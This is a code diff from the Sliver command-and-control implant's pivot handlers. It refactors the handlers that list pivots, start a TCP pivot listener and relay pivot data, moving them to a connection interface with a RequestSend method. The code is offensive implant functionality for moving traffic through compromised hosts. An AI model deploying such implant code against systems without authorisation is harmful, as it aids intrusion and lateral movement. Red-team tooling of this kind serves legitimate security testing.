@@ -1,3 +1,4 @@
+//go:build windows || linux || darwin
 // +build windows linux darwin
 
 package handlers
@@ -26,7 +27,6 @@ import (
 	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/pivots"
-	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
@@ -45,7 +45,7 @@ func GetPivotHandlers() map[uint32]PivotHandler {
 	return genericPivotHandlers
 }
 
-func pivotListHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+func pivotListHandler(envelope *sliverpb.Envelope, connection Connection) {
 	listReq := &sliverpb.PivotListReq{}
 	listResp := &sliverpb.PivotList{
 		Response: &commonpb.Response{},
@@ -57,10 +57,10 @@ func pivotListHandler(envelope *sliverpb.Envelope, connection *transports.Connec
 		// {{end}}
 		listResp.Response.Err = err.Error()
 		data, _ := proto.Marshal(listResp)
-		connection.Send <- &sliverpb.Envelope{
+		connection.RequestSend(&sliverpb.Envelope{
 			ID:   envelope.ID,
 			Data: data,
-		}
+		})
 		return
 	}
 	listeners := pivots.GetListeners()
@@ -73,13 +73,13 @@ func pivotListHandler(envelope *sliverpb.Envelope, connection *transports.Connec
 	}
 	listResp.Entries = entries
 	data, _ := proto.Marshal(listResp)
-	connection.Send <- &sliverpb.Envelope{
+	connection.RequestSend(&sliverpb.Envelope{
 		ID:   envelope.ID,
 		Data: data,
-	}
+	})
 }
 
-func tcpListenerHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+func tcpListenerHandler(envelope *sliverpb.Envelope, connection Connection) {
 
 	tcpPivot := &sliverpb.TCPPivotReq{}
 	err := proto.Unmarshal(envelope.Data, tcpPivot)
@@ -92,10 +92,10 @@ func tcpListenerHandler(envelope *sliverpb.Envelope, connection *transports.Conn
 			Response: &commonpb.Response{Err: err.Error()},
 		}
 		data, _ := proto.Marshal(tcpPivotResp)
-		connection.Send <- &sliverpb.Envelope{
+		connection.RequestSend(&sliverpb.Envelope{
 			ID:   envelope.GetID(),
 			Data: data,
-		}
+		})
 		return
 	}
 	err = pivots.StartTCPListener(tcpPivot.Address)
@@ -108,23 +108,23 @@ func tcpListenerHandler(envelope *sliverpb.Envelope, connection *transports.Conn
 			Response: &commonpb.Response{Err: err.Error()},
 		}
 		data, _ := proto.Marshal(tcpPivotResp)
-		connection.Send <- &sliverpb.Envelope{
+		connection.RequestSend(&sliverpb.Envelope{
 			ID:   envelope.GetID(),
 			Data: data,
-		}
+		})
 		return
 	}
 	tcpResp := &sliverpb.TCPPivot{
 		Success: true,
 	}
 	data, _ := proto.Marshal(tcpResp)
-	connection.Send <- &sliverpb.Envelope{
+	connection.RequestSend(&sliverpb.Envelope{
 		ID:   envelope.GetID(),
 		Data: data,
-	}
+	})
 }
 
-func pivotDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+func pivotDataHandler(envelope *sliverpb.Envelope, connection Connection) {
 	pivData := &sliverpb.PivotData{}
 	proto.Unmarshal(envelope.Data, pivData)
 
